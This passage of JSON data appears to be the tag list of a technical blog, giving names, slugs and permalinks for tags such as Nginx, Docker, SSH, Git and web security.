x","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"},{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/tags/Docker/"},{"name":"Terminal","slug":"Terminal","permalink":"https://www.0x2beace.com/tags/Terminal/"},{"name":"Mysqli","slug":"Mysqli","permalink":"https://www.0x2beace.com/tags/Mysqli/"},{"name":"PHPStorm","slug":"PHPStorm","permalink":"https://www.0x2beace.com/tags/PHPStorm/"},{"name":"算法","slug":"算法","permalink":"https://www.0x2beace.com/tags/%E7%AE%97%E6%B3%95/"},{"name":"局域网","slug":"局域网","permalink":"https://www.0x2beace.com/tags/%E5%B1%80%E5%9F%9F%E7%BD%91/"},{"name":"Postman","slug":"Postman","permalink":"https://www.0x2beace.com/tags/Postman/"},{"name":"JSON","slug":"JSON","permalink":"https://www.0x2beace.com/tags/JSON/"},{"name":"Xdebug","slug":"Xdebug","permalink":"https://www.0x2beace.com/tags/Xdebug/"},{"name":"DevOps","slug":"DevOps","permalink":"https://www.0x2beace.com/tags/DevOps/"},{"name":"K8S","slug":"K8S","permalink":"https://www.0x2beace.com/tags/K8S/"},{"name":"HTTPS","slug":"HTTPS","permalink":"https://www.0x2beace.com/tags/HTTPS/"},{"name":"SSL","slug":"SSL","permalink":"https://www.0x2beace.com/tags/SSL/"},{"name":"HTTP","slug":"HTTP","permalink":"https://www.0x2beace.com/tags/HTTP/"},{"name":"Certbot","slug":"Certbot","permalink":"https://www.0x2beace.com/tags/Certbot/"},{"name":"Zabbix","slug":"Zabbix","permalink":"https://www.0x2beace.com/tags/Zabbix/"},{"name":"监控系统","slug":"监控系统","permalink":"https://www.0x2beace.com/tags/%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F/"},{"name":"终端","slug":"终端","permalink":"https://www.0x2beace.com/tags/%E7%BB%88%E7%AB%AF/"},{"name":"Docker Hub","slug":"Docker-Hub","permalink":"https://www.0x2beace.com/tags/Docker-Hub/"},{"name":"SSH","slug":"SSH","permalink":"https://www.0x2beace.com/tags/SSH/"},{"name":"SSHD","slug":"SSHD","permalink":"https://www.0x2beace.com/tags/SSHD/"},{"name":"GoAccess","slug":"GoAccess","permalink":"https://www.0x2beace.com/tags/GoAccess/"},{"name":"Logs","slug":"Logs","permalink":"https://www.0x2beace.com/tags/Logs/"},{"name":"云","slug":"云","permalink":"https://www.0x2beace.com/tags/%E4%BA%91/"},{"name":"Linux Commands","slug":"Linux-Commands","permalink":"https://www.0x2beace.com/tags/Linux-Commands/"},{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"},{"name":"Socket.io","slug":"Socket-io","permalink":"https://www.0x2beace.com/tags/Socket-io/"},{"name":"wss","slug":"wss","permalink":"https://www.0x2beace.com/tags/wss/"},{"name":"Arch Linux","slug":"Arch-Linux","permalink":"https://www.0x2beace.com/tags/Arch-Linux/"},{"name":"WSL","slug":"WSL","permalink":"https://www.0x2beace.com/tags/WSL/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"},{"name":"进程管理","slug":"进程管理","permalink":"https://www.0x2beace.com/tags/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"name":"Supervisor","slug":"Supervisor","permalink":"https://www.0x2beace.com/tags/Supervisor/"},{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/tags/Node/"},{"name":"Hash","slug":"Hash","permalink":"https://www.0x2beace.com/tags/Hash/"},{"name":"Web 安全","slug":"Web-安全","permalink":"https://www.0x2beace.com/tags/Web-%E5%AE%89%E5%85%A8/"},{"name":"ssh","slug":"ssh","permalink":"https://www.0x2beace.com/tags/ssh/"},{"name":"PM2","slug":"PM2","permalink":"https://www.0x2beace.com/tags/PM2/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://www.0x2beace.com/tags/JavaScript/"}]}